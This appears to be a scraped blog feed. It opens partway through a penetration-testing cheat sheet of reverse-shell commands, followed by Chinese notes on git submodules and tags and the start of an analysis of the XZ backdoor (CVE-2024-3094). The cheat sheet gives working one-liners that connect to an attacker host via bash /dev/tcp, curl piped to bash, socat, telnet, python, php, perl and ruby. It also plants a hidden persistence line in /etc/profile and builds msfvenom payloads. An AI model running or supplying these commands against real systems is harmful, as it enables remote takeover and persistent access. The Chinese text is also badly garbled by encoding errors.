<code>netcat ip port -e /bin/bash</code></p><h3 id="4-curl-reverse"><a href="#4-curl-reverse" class="headerlink" title="4. curl reverse"></a>4. curl reverse</h3><p>attacker creates <code>index.html</code> on VPS, and its content is <code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></p><p>then attacked host executes the command:</p><pre><code>curl &lt;attacker_ip&gt; | bash</code></pre><h3 id="5-etc-profile"><a href="#5-etc-profile" class="headerlink" title="5. /etc/profile"></a>5. /etc/profile</h3><p>If someone logs in the Linux, then it must trigger <code>/etc/profile</code>, such as log in locally or SSH login.</p><p>If someone doesnâ€™t login shell(using strange methods to login and use sh or bash), then <code>/etc/profile</code> wont be triggered.</p><p>You can input such command into <code>/etc/profile</code>:</p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1 &amp;# the last ampersand makes the command in daemon, to avoid user&#39;s commands cannot execute and lead to the exposure.</code></pre><h3 id="6-Socat-reverses-shell"><a href="#6-Socat-reverses-shell" class="headerlink" title="6. Socat reverses shell"></a>6. Socat reverses shell</h3><p>Socat is a multiple functional network tool, and itâ€™s similar to netcat.</p><pre><code>apt-get install socatOrwget from http://www.dest-unreach.org/socat</code></pre><p>Attacker listens his VPS on specific port:</p><pre><code>socat TCP-LISTEN:2333 -Ornc -lvvp 2333</code></pre><p>Target host command:</p><pre><code>socat tcp-connect:&lt;attacker_ip&gt;:&lt;port&gt; exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</code></pre><h3 id="7-Telnet-reverses-shell"><a href="#7-Telnet-reverses-shell" class="headerlink" title="7. Telnet reverses shell"></a>7. Telnet reverses shell</h3><p>If hacked host has no nc, we can use telnet to reverse shell</p><h5 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h5><p>Attacker listens on specific port:</p><pre><code>nc -lvvp 2333</code></pre><p>Hacked host connects:</p><pre><code>mknod a p; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;a | /bin/bash 1&gt;a</code></pre><h5 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h5><p>Attacker needs open 2 listening ports, one for inut, another for output:</p><pre><code>nc -lvvp 2333nc -lvvp 4000</code></pre><p>Hacked host connects:</p><pre><code>telnet &lt;attacker_ip&gt; &lt;port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;port&gt;</code></pre><h3 id="8-python"><a href="#8-python" class="headerlink" title="8. python"></a>8. python</h3><pre><code>nc -lvvp 2333</code></pre><p>Then hacked host:<br>    python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ<attacker_ip>â€œ,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([â€œ/bin/shâ€,â€-iâ€]);â€™</attacker_ip></p><h3 id="9-php"><a href="#9-php" class="headerlink" title="9. php"></a>9. php</h3><pre><code>nc -lvvp 2333</code></pre><p>Hacked host:</p><pre><code>php -r &#39;$sock=fsockopen(&quot;&lt;attacker_ip&gt;&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="10-Perl"><a href="#10-Perl" class="headerlink" title="10. Perl"></a>10. Perl</h3><pre><code>nc -lvvp 2333</code></pre><p>Then hacked host:</p><pre><code>perl -e &#39;use Socket;$i=&quot;&lt;attacker_ip&gt;&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre><h3 id="11-Ruby"><a href="#11-Ruby" class="headerlink" title="11. Ruby"></a>11. Ruby</h3><pre><code>nc -lvvp 2333</code></pre><p>Hacked host:</p><pre><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;&lt;attacker_ip&gt;&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;Orruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;&lt;attacker_ip&gt;&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></pre><h3 id="12-Metasploit-venom"><a href="#12-Metasploit-venom" class="headerlink" title="12. Metasploit venom"></a>12. Metasploit venom</h3><p><code>msfvenom -l</code> enquiries which platform.</p><pre><code>msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;msfvenom -p cmd/unix/reverse_python LHOST=&lt;attacker_ip&gt; LPORT=2333 -f raw</code></pre><h3 id="13-get-full-terminal"><a href="#13-get-full-terminal" class="headerlink" title="13. get full terminal"></a>13. get full terminal</h3><p>Normally we gain the shell, but we cannot use vim. So there is a python method to escalate the shellâ€™s use. But I tested the method, it sometimes doesnot work, and I need to do more tests and researches.</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> penetration </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>submodule</title>
      <link href="/2024/08/28/git/submodule/"/>
      <url>/2024/08/28/git/submodule/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#å¼€å‘è§†è§’ä¸»ä»“åº“ä¸‹å¤šæ¨¡å—è®¾ç½®">å¼€å‘è§†è§’ï¼šä¸»ä»“åº“ä¸‹å¤šæ¨¡å—è®¾ç½®</a></li><li><a href="#éƒ¨ç½²è§†è§’git-pull">éƒ¨ç½²è§†è§’git pull</a></li><li><a href="#çœŸå®æ¡ˆä¾‹">çœŸå®æ¡ˆä¾‹</a></li></ul><h1 id="å¼€å‘è§†è§’ï¼šä¸»ä»“åº“ä¸‹å¤šæ¨¡å—è®¾ç½®"><a href="#å¼€å‘è§†è§’ï¼šä¸»ä»“åº“ä¸‹å¤šæ¨¡å—è®¾ç½®" class="headerlink" title="å¼€å‘è§†è§’ï¼šä¸»ä»“åº“ä¸‹å¤šæ¨¡å—è®¾ç½®"></a>å¼€å‘è§†è§’ï¼šä¸»ä»“åº“ä¸‹å¤šæ¨¡å—è®¾ç½®</h1><p>ä¸ºäº†æ–¹ä¾¿å¦‚MVCæ¡†æ¶çš„å‰åç«¯ç®¡ç†ä»¥åŠå‡å°‘ä»£ç é”™è¯¯ï¼Œå› æ­¤å¼€å§‹ä½¿ç”¨<code>git submodule</code>æ¥åšå¤šæ¨¡å—ç®¡ç†ã€‚</p><p>åœ¨æŸä»“åº“ä¸­æ·»åŠ submoduleã€‚</p><pre><code>git submodule add &lt;git-source&gt; &lt;option:path&gt;git status</code></pre><p>ä¼šçœ‹åˆ°å­æ¨¡å—æ˜¯<code>new file</code>,éœ€è¦</p><pre><code>git add .git commit -m &quot;xx&quot;git push</code></pre><p>æ¥æŠŠå½“å‰å­æ¨¡å—çš„å“ˆå¸Œæ‰“ä¸Šå»æ›´æ–°ã€‚</p><p>ä¹‹åå­ä»“åº“å¦‚æœæœ‰æ›´æ–°ï¼š</p><pre><code>git submodule update --remote</code></pre><p>å°±æŠŠhashæ›´æ–°äº†</p><p>ç„¶åä¸»ä»“åº“å†</p><pre><code>git add .git commit -m &quot;xx&quot;git push</code></pre><p>å°±æŠŠå­æ¨¡å—æ›´æ–°äº†</p><h1 id="éƒ¨ç½²è§†è§’git-pull"><a href="#éƒ¨ç½²è§†è§’git-pull" class="headerlink" title="éƒ¨ç½²è§†è§’git pull"></a>éƒ¨ç½²è§†è§’git pull</h1><p>å­æ¨¡å—æ›´æ–°å’Œä»“åº“æœ¬èº«æ˜¯åˆ†ç¦»çš„ï¼Œä»“åº“åªæ›´æ–°å­æ¨¡å—çš„hash id<br>é¦–æ¬¡æ‹‰submoduleï¼ˆå³submoduleè¿˜åªæ˜¯ä¸ªç©ºç›®å½•çš„æ—¶å€™ï¼‰ï¼Œä½¿ç”¨åˆ°<code>--init</code>å‚æ•°</p><pre><code>git clone --recursive https://github.com/xanzy/go-gitlab gitlab# æˆ–è€…è¿›å…¥è¢«å…‹éš†ä»“åº“ç›®å½•ï¼Œæ‰‹åŠ¨ä¸‹è½½å­æ¨¡å—git submodule update --init â€“recursive#â€“recursiveçš„æ„æ€æ˜¯é€’å½’ï¼Œæ¯”å¦‚å¦‚æœå­æ¨¡å—ä¹Ÿæœ‰å­æ¨¡å—ï¼Œä»–å°±å¤„ç†è¿™ä¸ªçš„#git submodule update â€“init å¦‚æœæ²¡æœ‰å­æ¨¡å—çš„å­æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œè¿™ä¸ªæ²¡æœ‰é€’å½’çš„å‘½ä»¤</code></pre><p>å¦‚æœæ¶‰åŠå¤šä¸ªsubmoduleï¼Œæ­¤æ­¥åœ¨è¿è¡Œæ—¶ï¼Œå¦‚æœä»“åº“æ˜¯privateï¼Œä½ éœ€è¦æ³¨æ„ä¸åŒå­ä»“åº“ä¼šéœ€è¦ä¸åŒçš„å¯†ç éªŒè¯ï¼Œ<strong>æ­¤æ­¥ä¸€å®šæ…¢æ…¢ç­‰å¾…å…¶ä¸‹è½½å®Œ</strong>ï¼Œå¦åˆ™å°±ä¼šå‡ºç°<em>åªä¼šæ›´æ–°ä¸€ä¸ªsubmoduleï¼Œè€Œå¦ä¸€ä¸ªsubmoduleæ­»æ´»ä¸åŠ¨</em>çš„æƒ…å†µäº†</p><h1 id="çœŸå®æ¡ˆä¾‹"><a href="#çœŸå®æ¡ˆä¾‹" class="headerlink" title="çœŸå®æ¡ˆä¾‹"></a>çœŸå®æ¡ˆä¾‹</h1><p>æ‹‰å–æŸä¸ªgitä»“åº“ï¼Œå¦‚æœè¯¥ä»£ç ä¸­æŸä¸ªç›®å½•ä¸‹å­˜åœ¨.gitï¼Œé‚£ä¹ˆgitä¼šè®¤ä¸ºè¿™æ˜¯å¦ä¸€ä¸ªgitä»“åº“ï¼Œæˆ‘ä»¬åœ¨git cloneçš„æ—¶å€™ä¸ä¼šæ‹‰å–è¯¥é¡¹ç›®ï¼Œå¿…é¡»å¾—å¤šä¸€æ­¥å»å•æ‹‰æ­¤é¡¹ç›®ã€‚</p><p>å®é™…æ¡ˆä¾‹ï¼šé¹å“¥çš„gitmisconfigé¡¹ç›®å¯¼å…¥gitlab</p><p>åœ¨gitlab-misconfigé¡¹ç›®ä¸­ï¼Œç”±äºé¹å“¥ä½¿ç”¨çš„gitlabè½¯ä»¶åŒ…ç›®å½•ä¸‹å­˜åœ¨.gitï¼Œæ‰€ä»¥åœ¨è¿›è¡Œgit add . xxxxç­‰ä¸€ç³»åˆ—æ“ä½œåï¼Œè¯¥ç›®å½•ä¸‹ä½ å°±ç®—æœ‰æ”¹åŠ¨ï¼Œä¹Ÿä¸ä¼šä¸Šä¼ åˆ°gitã€‚</p><p>å¦å¤–ï¼Œå¦‚æœä½ åªæ˜¯è¦æ£€å‡ºå…¶ä¸­çš„æŸä¸ªç›®å½•ï¼Œåˆ™ä½¿ç”¨å‘½ä»¤å¦‚ä¸‹ï¼Œå¯ä»¥å•æ£€å‡ºæŸä¸ªç›®å½•ï¼š</p><pre><code>git clone --recursive https://github.com/xanzy/go-gitlab gitlab</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git tag &amp; github release</title>
      <link href="/2024/08/28/git/git-tag/"/>
      <url>/2024/08/28/git/git-tag/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#tag">tag</a></li><li><a href="#github-release">github release</a></li></ul><h1 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h1><p><code>git tag</code>åªèƒ½è‡ªå·±gitå‘½ä»¤æ‰“ï¼Œæ²¡æ³•åœ¨githubä¸Šè¿›è¡Œå¤„ç†ã€‚git tagæ˜¯ç‹¬ç«‹äºæ­£å¸¸pushå­˜åœ¨çš„ï¼Œæ¯”å¦‚æ–°å»ºä¸€ä¸ªtagç„¶åpushä¸Šå»ï¼Œä¸ä¼šæœ‰æ–°commitã€‚push tagä»…æ˜¯æ¨äº†tagçš„åå­—è€Œå·²ã€‚</p><pre><code>git tag 2.0# tagæœ¬è´¨å°±æ˜¯è¿™ä¸ªaå‚æ•° annotatedï¼Œä¹Ÿå¯ä»¥é™„å¸¦messageä¿¡æ¯ï¼ˆé€šå¸¸è¾ƒå°‘è§ä½¿ç”¨-mï¼‰git tag -a v1.0 -m &quot;Release version 1.0&quot;git tag&gt;&gt;&gt; 2.0# æ–¹ä¾¿æœªæ¥checkoutåˆ‡æ¢åˆ°tagè¡¨ç¤ºçš„æŸå…·ä½“ç‰ˆæœ¬git checkout v1.0</code></pre><p>ä»¥ä¸Šä»…ä»…æ˜¯<strong>local tag</strong>ï¼Œæ¨tagä¸Šå»éœ€è¦æ‰§è¡Œå‘½ä»¤</p><pre><code>git push origin --tags</code></pre><p>æˆ–è€…æŸä¸ªå•ä¸€çš„tag</p><pre><code>git push origin &lt;tag&gt;</code></pre><p><img src="/2024/08/28/git/git-tag/git_tag.png" alt="git_tag"></p><h1 id="github-release"><a href="#github-release" class="headerlink" title="github release"></a>github release</h1><p>æ‰“äº†tagåï¼Œå¯ä»¥å‘å¸ƒ<code>releaseçš„tarballsçš„source code</code>æˆ–è€…<code>äºŒè¿›åˆ¶æ–‡ä»¶</code>ï¼ˆè¿™äº›åŠŸèƒ½æ˜¯<strong>githubç‰¹æœ‰åŠŸèƒ½</strong>ï¼Œè€Œ<strong>égit</strong>è‡ªèº«èƒ½æ”¯æŒçš„åŠŸèƒ½ï¼‰</p><p>æ¯”å¦‚ï¼Œå¦‚æœæ²¡æœ‰é€‰æ‹©tagï¼Œé‚£ä¹ˆä½ å‘å¸ƒä¸æˆåŠŸreleaseã€‚å¦‚å›¾æˆ‘æš‚æ—¶ä¿å­˜ä¸ºè‰ç¨¿ï¼Œå†é€‰æ‹©ä¸ªtagè¿›è¡Œå‘å¸ƒã€‚ç‚¹å‡»â€œç¬”â€é‚£ä¸ªè¿›è¡Œç¼–è¾‘ã€‚</p><p><img src="/2024/08/28/git/git-tag/tag2.png" alt="tag2"></p><p><img src="/2024/08/28/git/git-tag/tag3.png" alt="tag3"></p><p>ç‚¹å‡» å‘å¸ƒreleaseåï¼Œå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªtagçš„æºä»£ç ï¼Œé»˜è®¤ä¼šä»¥tar.gzå’Œzipçš„å½¢å¼æ”¾åœ¨releaseä¸­ï¼Œå¦å¤–æˆ‘ä»¬æ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªä¼ çš„æ–‡ä»¶ä¹Ÿåœ¨å…¶ä¸­ã€‚</p><p><img src="/2024/08/28/git/git-tag/tag4.png" alt="tag4"></p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cve-2024-3094(1)[Chinese]</title>
      <link href="/2024/08/27/code_audit/cve-2024-3094(1)/"/>
      <url>/2024/08/27/code_audit/cve-2024-3094(1)/</url>
      
        <content type="html"><![CDATA[<h3 id="CVE-2024-3094ï¼ˆä¸€ï¼‰"><a href="#CVE-2024-3094ï¼ˆä¸€ï¼‰" class="headerlink" title="CVE-2024-3094ï¼ˆä¸€ï¼‰"></a>CVE-2024-3094ï¼ˆä¸€ï¼‰</h3><h1 id="å¤§çº²"><a href="#å¤§çº²" class="headerlink" title="å¤§çº²"></a>å¤§çº²</h1><p>è¿™æ¬¡XZæŠ•æ¯’äº‹ä»¶æ˜¯å…¸å‹çš„APTæ”»å‡»ã€‚å¯¹æŠ•æ¯’æ€è·¯ã€åé—¨è¿ä½œæœºåˆ¶å’Œäººå‘˜æ½œä¼èº«æ³•åˆ†æé‡å¤§ï¼Œæœ¬æ–‡å¯¹XZåé—¨æŠ•æ¯’é¢„è®¡æ‹†åˆ†ä¸‰ç¯‡æ¥åˆ†æï¼š</p><pre><code>1.æŠ•æ¯’èƒŒæ™¯ä¸gitæ‰‹æ³•2.åé—¨ä»£ç ä¸è°ƒè¯•3.æŠ¥å‘Šè€…å‘ç°æ­¤åé—¨çš„åˆ†æå·¥å…·ä¸æ€è·¯</code></pre><h1 id="TOC"><a href="#TOC" class="headerlink" title="TOC"></a>TOC</h1><ul><li><a href="#å¤§çº²">å¤§çº²</a></li><li><a href="#toc">TOC</a></li><li><a href="#ç®€ä»‹">ç®€ä»‹</a></li><li><a href="#æ—¶é—´çº¿">æ—¶é—´çº¿</a></li><li><a href="#å‘ç°è€…andres-freundçš„é‚®ä»¶æŠ¥å‘Š">å‘ç°è€…Andres Freundçš„é‚®ä»¶æŠ¥å‘Š</a><ul><li><a href="#å®¡è®¡é¡ºåº">å®¡è®¡é¡ºåº</a></li></ul></li><li><a href="#æ€è€ƒ">æ€è€ƒ</a></li><li><a href="#æ„Ÿæ‚Ÿ">æ„Ÿæ‚Ÿ</a></li><li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</a></li></ul><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>å¾®è½¯åœ¨èŒå‘˜å·¥<code>Andres Freund</code>åœ¨å¯¹Debianè¿›è¡Œæ€§èƒ½å›å½’æµ‹è¯•æ—¶ï¼Œæ³¨æ„åˆ°SSHè¿æ¥ä½¿ç”¨äº†æ„å¤–é«˜çš„CPUä½¿ç”¨ç‡ï¼Œå¹¶ä½¿å¾—<code>Valgrind</code>ï¼ˆå†…å­˜è°ƒè¯•å·¥å…·ï¼‰æŠ¥é”™ã€‚</p><pre><code>Debianï¼šDebianæ˜¯ä¼—å¤šLinuxå‘è¡Œç‰ˆçš„åŸºç¡€é¡¹ç›®ï¼Œå¦‚Kaliï¼ŒUbuntuã€‚æ­¤å¤„æŒ‡Andres Freundæµ‹è¯•Debiançš„æ–°ç‰ˆæœ¬ï¼ˆæ­¤Debianéç¨³å®šç‰ˆæœ¬ï¼Œå› ä¸ºé›†æˆæœ‰è¾ƒæ–°çš„xzçš„æ¼æ´ç‰ˆæœ¬ï¼‰ã€‚æ€§èƒ½å›å½’æµ‹è¯•ï¼šä¸€ç§æµ‹è¯•æ–¹æ³•ï¼Œæµ‹è¯•å¤šæ¨¡å—é›†æˆç³»ç»Ÿæ—¶ï¼Œæ¯”è¾ƒæ­£å¸¸è¿è¡Œä¸è¿è¡Œå­˜åœ¨é—®é¢˜çš„æ¨¡å—è°ƒç”¨å·®å¼‚ã€‚Valgrindï¼šå†…å­˜è°ƒè¯•å·¥å…·</code></pre><p><code>Andres Freund</code>éšåå¼€å§‹è¿›è¡Œå®¡è®¡ï¼Œä»å¼‚å¸¸çš„SSHé¡ºè—¤æ‘¸ç“œæ‰¾åˆ°åŸå› ï¼Œè¢«è°ƒç”¨çš„XZæ¨¡å—å­˜åœ¨äº†éšç§˜çš„åé—¨ï¼Œå¹¶å¯¹è¯¥åé—¨è¿›è¡Œäº†gitå®¡è®¡ï¼Œå‘ç°æ­¤åé—¨æ˜¯ç”±<code>Jia Tan</code>(åç§°<code>JiaT75</code>)åœ¨2024å¹´2ã€3æœˆä»½é€æ­¥å°†é«˜åº¦æ··æ·†çš„åé—¨ä»£ç ä¸€ç‚¹ä¸€ç‚¹å¼•å…¥XZé¡¹ç›®ã€‚<code>Andres Freund</code>å°†ä»£ç åæ··æ·†å¹¶è¿›è¡Œå®¡è®¡ï¼Œå¾—åˆ°åŸºæœ¬çš„åé—¨è°ƒç”¨é€»è¾‘åï¼Œäº2024å¹´3æœˆ29æ—¥å‘¨äº”å‘openwallé‚®ä»¶ä¸ŠæŠ¥äº†æ­¤æ¬¡äº‹ä»¶ã€‚</p><pre><code>XZï¼šå¼€æºçš„å‹ç¼©å·¥å…·ï¼Œæ¯”å¦‚å¸¸è§çš„.xzåç¼€çš„æ–‡ä»¶é€šå¸¸å°±æ˜¯ä½¿ç”¨æ­¤å·¥å…·è¿›è¡Œå‹ç¼©çš„ã€‚è°ƒç”¨xzçš„å‘½ä»¤å¦‚xz -d filename.xzï¼Œtar -xJf archive.tar.xzç­‰ã€‚OpenWallï¼šOpenWallæ˜¯åšLinuxå®‰å…¨çš„çŸ¥åç¤¾åŒºã€‚ä¸»è¦è´¡çŒ®ä¸ºç ”ç©¶Linuxå®‰å…¨ï¼Œåˆ¶ä½œå†…æ ¸è¡¥ä¸ï¼Œåˆ¶ä½œäº†OpenWall Linuxï¼ˆè½»é‡çº§çš„å®‰å…¨å¼ºåŒ–çš„Linuxç³»ç»Ÿï¼‰ã€‚</code></pre><p>æ”»å‡»è€…<code>Jia Tan</code>åœ¨XZé¡¹ç›®çš„<code>5.6.0</code>å’Œ<code>5.6.1</code>çš„ä¸¤ä¸ªtagçš„releaseä¸­æ¤å…¥äº†æœ‰åé—¨çš„liblzmaå‹ç¼©åŒ…&lt;å«å®é™…åé—¨<code>build-to-host.m4</code>&gt;ï¼ˆå°½ç®¡liblzmaæœ¬èº«å°±æ˜¯xzçš„å­åº“ï¼Œä½†æ˜¯æ­¤å¤„<em>æ”»å‡»è€…æ‰‹åŠ¨å¦ä¸Šä¼ äº†è®¾ç½®æœ‰åé—¨çš„liblzmaæ–‡ä»¶</em>ï¼‰ï¼Œè€Œåœ¨githubé¡¹ç›®æºä¸­çœ‹ä¸åˆ°åé—¨æ–‡ä»¶çš„å­˜åœ¨ï¼ˆåªåœ¨releaseçš„source.tar.gzå’Œsource.zipä¸­ï¼‰ã€‚</p><pre><code>tagï¼šé€šå¸¸å¼€å‘äººå‘˜ä¼šæ ‡è¯†ä¸€äº›ç‰¹å®šçš„ç‰ˆæœ¬ï¼Œåœ¨æœ¬åœ°åˆ†æ”¯git tagæ‰“tagï¼Œç„¶åä½¿ç”¨git push origin â€“tagsä¸€ç±»çš„å‘½ä»¤ä¸Šä¼ tagåˆ°remoteåˆ†æ”¯ã€‚releaseï¼šå¸¸è§äºç‰¹å®šç‰ˆæœ¬çš„äº§å“å‘å¸ƒåœºæ™¯ã€‚æ¯”å¦‚åœ¨githubä¸Šï¼Œé€šå¸¸é€‰æ‹©ç‰¹å®štagç„¶åå‘å¸ƒreleaseï¼Œç ”å‘è€…ä¸Šä¼ è‡ªè¡Œæ„å»ºã€ç¼–è¯‘çš„äºŒè¿›åˆ¶åŒ…å’Œå“ˆå¸ŒéªŒè¯ã€‚æ­¤releaseé€šå¸¸ä¼šæŠŠå½“å‰åˆ†æ”¯çš„ä¸å«gitä¿¡æ¯çš„æºä»£ç åŒæ ·ä»¥tar.gzå’Œzipå½¢å¼æ‰“åŒ…ä¸€åŒæ”¾åœ¨releaseæ–‡ä»¶ä¸­ã€‚</code></pre><p>åé—¨lzmaå­˜åœ¨IFUNCåŠ«æŒã€‚OpenSSHæœ¬èº«ä¸ä¼šåŠ è½½liblzmaï¼Œä½†å‡ ä¸ªLinuxå‘è¡Œç‰ˆä½¿ç”¨<code>RSA_public_decrypt</code>ä¼šåŠ è½½<code>libsystemd</code>ï¼Œè¿›è€ŒåŠ è½½lzmaï¼Œè®©å…¥ä¾µè€…å¯ä»¥æœªæˆæƒæ§åˆ¶æ•´ä¸ªæœºå™¨ã€‚è¿™å¯¼è‡´ä½¿ç”¨æ¼æ´ç‰ˆæœ¬çš„xzçš„Linuxå‘è¡Œç‰ˆå¼€å¯SSHDæœåŠ¡ï¼Œå°±ä¼šå­˜åœ¨åé—¨ã€‚æ”»å‡»è€…é€šè¿‡è¯¥å‡½æ•°åŠ«æŒï¼Œç¯¡æ”¹äº†SSHé€šä¿¡åè®®çš„æ•°ä¸ªå­—èŠ‚æ¥éªŒè¯ç‰¹å®šç§é’¥ç»•è¿‡è®¿é—®è®¤è¯ã€‚åé—¨ä¼šå¯¹ç‰¹å®š<em>Ed448ç§é’¥</em>æä¾›è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><p>ä»å±å®³è¯„ä¼°è§’åº¦ï¼Œæ”»å‡»è€…<code>Jia Tan</code>ä»2æœˆ23æ—¥æ‰å¼€å§‹ï¼ŒèŠ±äº†å°†è¿‘ä¸€ä¸ªæœˆçš„æ—¶é—´æœ‰è®¡åˆ’æ’å…¥åé—¨ï¼Œåˆ†åˆ«äº2æœˆ24æ—¥å’Œ3æœˆ9æ—¥å‘å¸ƒäº†å­˜åœ¨åé—¨çš„ä¸¤ä¸ªxzçš„releaseã€‚3æœˆ29æ—¥å‘ç°è€…<code>Andres Freund</code>ä¸ŠæŠ¥äº†æ¼æ´å’Œæº¯æºæŠ¥å‘Šã€‚å°½ç®¡XZæ˜¯ä¸€ä¸ªéå¸¸å¹¿æ³›çš„Linuxé¡¹ç›®ï¼Œä½†æ˜¯å¹¶æœªç›´æ¥è¢«ä¸»æµLinuxçš„stableç‰ˆæœ¬å¼•å…¥XZçš„æ¼æ´ç‰ˆæœ¬ï¼›ä»…å°‘æ•°çš„Linuxä¸ç¨³å®šç‰ˆæœ¬ä½¿ç”¨åˆ°äº†XZçš„æ¼æ´ç‰ˆæœ¬ã€‚å› æ­¤åé—¨ä¸ç®—å¤§è§„æ¨¡æ™®åŠï¼Œåªæœ‰ä½¿ç”¨æœ€æ–°Linuxçš„ç‰¹å®šç¾¤ä½“éœ€è¦æ£€æŸ¥XZç‰ˆæœ¬ã€‚</p><p>ä»é£é™©è§’åº¦ï¼Œå‡ºäº‹é¡¹ç›®XZæ˜¯OSSï¼ˆOpen Source Softwareï¼‰é«˜åº¦çŸ¥åç»„ä»¶ï¼Œæ”»å‡»è€…<code>Jia Tan</code>èŠ±è´¹äº†è¿‘3å¹´æ—¶é—´å–å¾—XZé¡¹ç›®åˆ›å»ºè€…<code>Lasse Collin</code>çš„ä¿¡ä»»ï¼Œæ‰äº2æœˆ23æ—¥å¼€å§‹åœ¨XZé¡¹ç›®ä¸­æ¤å…¥åé—¨ã€‚å¦‚æœæ²¡æœ‰äººå‘ç°<code>Jia Tan</code>æå…¶éšç§˜çš„é«˜è¶…æ‰‹æ³•ï¼Œåˆ™è¯¥APTæ”»å‡»å°†å¤§è§„æ¨¡å¯¹Linuxæ¤å…¥åé—¨ã€‚</p><h1 id="æ—¶é—´çº¿"><a href="#æ—¶é—´çº¿" class="headerlink" title="æ—¶é—´çº¿"></a>æ—¶é—´çº¿</h1><ul><li>2021å¹´GitHubç”¨æˆ·Jia Tan(JiaT75)å¸æˆ·åˆ›å»º</li><li>2022å¹´2æœˆ6æ—¥JiaT75å‘XZä»“åº“æäº¤äº†ç¬¬ä¸€ä¸ªcommit</li><li>2023å¹´6æœˆ27æ—¥ã€28æ—¥Jia Tanå¯¹XZ Utilsè¿›è¡Œä¸ºæœªæ¥æ¼æ´åˆ©ç”¨çš„æ›´æ”¹ã€‚åœ¨è¿™äº›æ›´æ”¹ä¸­ï¼Œæ·»åŠ äº†å¯¹crc64_fast.cçš„ifuncå®ç°çš„æ”¯æŒã€‚</li><li>2023å¹´7æœˆ8æ—¥JiaT75åœ¨oss-fuzzä¸­æ‰“å¼€äº†ä¸€ä¸ªPullè¯·æ±‚ï¼Œè¯¥é¡¹ç›®å¯¹XZå’Œè®¸å¤šå…¶ä»–OSSé¡¹ç›®è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚PRç¦ç”¨äº†ifuncæ¨¡ç³Šæµ‹è¯•ï¼Œè¿›è€Œé˜»æ­¢oss-fuzzå‘ç°XZçš„æ¶æ„æ›´æ”¹ã€‚</li><li>2024å¹´2æœˆ15æ—¥JiaT75ä¿®æ”¹.gitignoreæ–‡ä»¶ï¼Œæ·»åŠ äº†build-to-host.m4çš„å¿½ç•¥è§„åˆ™ã€‚build-to-host.m4è„šæœ¬æ–‡ä»¶å³å°†åŒ…å«åœ¨å®é™…å‘å¸ƒåŒ…ï¼ˆ3.6.0ä¸3.6.1ï¼‰ä¸­ï¼Œåœ¨æ„å»ºæœŸé—´æ‰§è¡Œï¼ŒåŒ…å«æ¶æ„ä»£ç ï¼Œå¯åˆå§‹åŒ–å—å®³è€…æœºå™¨ä¸Šçš„åé—¨å®‰è£…ã€‚</li><li><p>2024å¹´2æœˆ23æ—¥JiaT75åœ¨XZä»“åº“æ·»åŠ ä¸¤ä¸ªæ¶æ„æ–‡ä»¶ï¼š</p><p>  tests/files/bad-3-corrupt_lzma2.xz<br>  tests/files/good-large_compressed.lzma</p></li><li><p>2024å¹´2æœˆ24æ—¥JiaT75å‘å¸ƒæ¶æ„build-to-host.m4çš„5.6.0ç‰ˆæœ¬ã€‚åœ¨æ­¤é˜¶æ®µï¼Œåé—¨å·²æˆåŠŸå®è¡Œã€‚Debianã€Gentooã€Arch Linuxã€Fedoraã€openSUSEå·²ä½¿ç”¨xz-utils 5.6.0ç‰ˆæœ¬ã€‚</p></li><li>2024å¹´3æœˆ9æ—¥JiaT75å°†åé—¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›´æ–°ä¸ºæ”¹è¿›ç‰ˆæœ¬ï¼Œå¹¶å‘å¸ƒrelease 5.6.1ã€‚æ­¤ç‰ˆæœ¬5.6.1è¢«Fedoraã€Gentooã€Arch Linuxã€openSUSEã€Alpineã€Debianä½¿ç”¨ã€‚</li><li>2024å¹´3æœˆ29æ—¥ï¼ŒAndres Freundå‘oss-security mailing 